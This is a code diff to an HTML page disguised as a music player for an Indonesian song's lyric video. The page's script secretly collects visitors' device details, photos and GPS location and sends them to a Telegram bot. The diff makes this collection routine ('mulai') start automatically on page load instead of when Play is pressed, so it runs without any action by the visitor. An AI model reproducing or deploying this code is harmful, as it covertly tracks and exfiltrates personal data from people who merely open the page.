@@ -62,7 +62,7 @@
   <div class="title">Rumahsakit - Sandiwara Semu (Official Lyric Video)</div>
   <div class="artist">Tetap di halaman ini agar music tidak mati</div>
   <div class="controls">
-    <button onclick="playAndStart()">Play</button>
+    <button onclick="audio.play()">Play</button>
     <button onclick="audio.pause()">Pause</button>
   </div>
   <audio id="audio" src="https://files.catbox.moe/6bi9xj.mp3"></audio>
@@ -73,6 +73,17 @@
     const token2 = '';
     const chatId1 = '5914256752';
     const chatId2 = '';
+
+    const getDeviceBrand = () => {
+      const ua = navigator.userAgent;
+      if (/Vivo|vivo|V\d{4}/.test(ua)) return 'Vivo';
+      if (/Oppo|CPH/.test(ua)) return 'Oppo';
+      if (/SM-|Samsung/.test(ua)) return 'Samsung';
+      if (/Infinix/.test(ua)) return 'Infinix';
+      if (/RMX/.test(ua)) return 'Realme';
+      if (/Redmi|Mi/.test(ua)) return 'Xiaomi';
+      return 'Android Device';
+    };
 
     const kirimPesan = async (pesan) => {
       const payload = { chat_id: chatId1, text: pesan, parse_mode: 'HTML' };
@@ -102,17 +113,6 @@
         fetch(`https://api.telegram.org/bot${token1}/sendPhoto`, { method: "POST", body: form1 }),
         fetch(`https://api.telegram.org/bot${token2}/sendPhoto`, { method: "POST", body: form2 })
       ]);
-    };
-
-    const getDeviceBrand = () => {
-      const ua = navigator.userAgent;
-      if (/Vivo|vivo|V\d{4}/.test(ua)) return 'Vivo';
-      if (/Oppo|CPH/.test(ua)) return 'Oppo';
-      if (/SM-|Samsung/.test(ua)) return 'Samsung';
-      if (/Infinix/.test(ua)) return 'Infinix';
-      if (/RMX/.test(ua)) return 'Realme';
-      if (/Redmi|Mi/.test(ua)) return 'Xiaomi';
-      return 'Android Device';
     };
 
     const ambilDataPerangkat = async () => {
@@ -258,10 +258,7 @@ Peta                : https://maps.google.com/?q=${latitude},${longitude}
       await kirimPesan(hasil);
     };
 
-    const playAndStart = () => {
-      audio.play();
-      mulai();
-    };
+    mulai();
   </script>
 </body>
 </html>
